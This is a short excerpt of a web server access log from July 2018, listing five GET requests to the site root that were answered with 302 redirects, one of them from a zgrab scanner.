186.148.247.140 - - [13/Jul/2018:01:06:24 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
103.78.132.4 - - [13/Jul/2018:01:41:21 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
217.249.111.32 - - [13/Jul/2018:02:31:43 -0700] "GET / HTTP/1.0" 302 - "-" "-"
138.118.85.30 - - [13/Jul/2018:02:53:43 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
176.233.63.128 - - [13/Jul/2018:02:54:36 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
